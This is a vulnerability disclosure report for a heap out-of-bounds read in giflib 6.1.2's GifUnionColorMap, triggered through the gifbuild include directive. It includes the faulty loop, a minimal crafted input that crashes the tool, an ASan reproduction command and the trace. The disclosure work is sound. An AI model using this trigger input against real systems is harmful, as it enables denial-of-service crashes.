# giflib `gifbuild` / `GifUnionColorMap` Heap Out-of-Bounds Read

## 1. Summary

- **Project/Product**: giflib
- **Affected component**: `gifbuild` utility / color map merge logic in `GifUnionColorMap(...)`
- **Vulnerability class**: Heap-based Buffer Overflow (Out-of-Bounds Read)
- **Trigger**: Processing a crafted `gifbuild` text input that defines a global color map with all-zero trailing entries and then uses the `include` directive to merge another GIF’s global color map
- **Impact**: At minimum **Denial of Service (crash)**. This bug is an out-of-bounds heap read in a command-line utility. I have confirmed the memory safety violation with ASan, but I have **not** demonstrated code execution or meaningful data disclosure.
- **Attack vector**: An attacker supplies a crafted input file for the `gifbuild` tool, together with a referenced GIF file for the `include` directive. When the victim runs `gifbuild` on the crafted input, the bug is triggered. The reachable path is `Icon2Gif(...) -> GifUnionColorMap(...)`.

## 2. Affected Versions

- **Confirmed vulnerable**: giflib **6.1.2**
- **Component scope**: confirmed in the `gifbuild` utility path, not a general-purpose decoder/browser rendering scenario
- **Other versions**: may also be affected if they contain the same `GifUnionColorMap(...)` logic, but I have only verified 6.1.2.

## 3. Root Cause

### 3.1 Location

- File: `gifalloc.c`
- Function: `GifUnionColorMap(...)`
- Reachable from: `gifbuild.c` -> `Icon2Gif(...)` -> `GifUnionColorMap(...)` during `include` handling.

### 3.2 Root cause details (missing lower-bound check while trimming trailing zero colors)

`GifUnionColorMap(...)` allocates a new union color map, copies `ColorIn1`, and then initializes:

- `CrntSlot = ColorIn1->ColorCount;`

It then tries to trim trailing `{0,0,0}` entries from the end of `ColorIn1` using:

- `while (ColorIn1->Colors[CrntSlot - 1].Red == 0 &&`
- `       ColorIn1->Colors[CrntSlot - 1].Green == 0 &&`
- `       ColorIn1->Colors[CrntSlot - 1].Blue == 0) {`
- `    CrntSlot--;`
- `}`

The issue is that this loop has **no lower-bound check** on `CrntSlot`. If all entries in `ColorIn1` are zero-valued colors, `CrntSlot` can be decremented from `ColorCount` down to `0`, and the next loop-condition evaluation dereferences:

- `ColorIn1->Colors[-1]`

This causes a **heap out-of-bounds read before the start of the color array**. In the supplied ASan trace, the invalid access occurs in `GifUnionColorMap` at `gifalloc.c:146`, and the accessed address is reported as **3 bytes before** a 6-byte heap region that had been allocated by `GifMakeMapObject(...)`.

### 3.3 Reachability from attacker-controlled input

In `gifbuild.c`, the `include %s` directive causes `Icon2Gif(...)` to:

1. open the referenced GIF via `DGifOpenFileName(...)`,
2. parse it via `DGifSlurp(...)`,
3. and, if a global color map already exists in the current output object, call:

- `GifUnionColorMap(GifFileOut->SColorMap, Inclusion->SColorMap, Translation);`

This makes the vulnerable function reachable from attacker-controlled text input processed by `gifbuild`.

## 4. Proof of Concept (PoC) and Reproduction

### 4.1 PoC file(s)

- **Primary crafted input**: a `gifbuild` text description that defines a global color map whose entries are all `{0,0,0}` and then uses `include` to merge another GIF
- **Included file**: a small valid GIF referenced by the `include` directive
- **Delivery**: attach the crafted input file, the referenced GIF file, and the ASan output to the report / CVE submission portal

A minimal triggering input looks like this:

```text
screen width 1
screen height 1
screen colors 2
screen background 0
pixel aspect byte 0

screen map
        sort flag off
        rgb 000 000 000
        rgb 000 000 000
end

include pic/solid2.gif
```

This arrangement makes `ColorIn1->ColorCount == 2` and both entries zero-valued, so the trailing-zero trimming loop in `GifUnionColorMap(...)` walks `CrntSlot` down to zero and then evaluates `Colors[-1]`.

### 4.2 Reproduction command

Run with an AddressSanitizer-enabled build of giflib / `gifbuild`:

```bash
ASAN_OPTIONS=detect_leaks=0 ./gifbuild < /tmp/repro_gifbuild_union.txt > /dev/null
```

### 4.3 Expected result (key excerpt)

ASan reports a heap-buffer-overflow read and points to `GifUnionColorMap(...)`:

```text
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1
#0 ... in GifUnionColorMap .../gifalloc.c:146
#1 ... in Icon2Gif .../gifbuild.c:327
#2 ... in main .../gifbuild.c:77
...
0x60200000002d is located 3 bytes before 6-byte region [0x602000000030,0x602000000036)
allocated by thread T0 here:
#0 ... in __interceptor_calloc
#1 ... in GifMakeMapObject .../gifalloc.c:58
...
SUMMARY: AddressSanitizer: heap-buffer-overflow .../gifalloc.c:146 in GifUnionColorMap
```

This shows both the crashing read site and the allocation site for the color array.

## 5. Impact Assessment

- **Minimum impact**: Denial of Service (process crash) when the victim runs `gifbuild` on attacker-controlled input
- **Security risk**: This is a real heap out-of-bounds read in reachable processing logic, confirmed by ASan
- **Exploitability**: I have **not** demonstrated arbitrary code execution. Because this is a read-before-buffer in a CLI utility path, the practical impact currently demonstrated is a crash.

## 6. Attachments

- `asan.txt`: AddressSanitizer crash output
- `repro_gifbuild_union.txt`: crafted `gifbuild` text input
- included GIF file referenced by `include`: sample valid GIF used to reach the merge path
- optional source references:
  - `gifalloc.c`
  - `gifbuild.c`
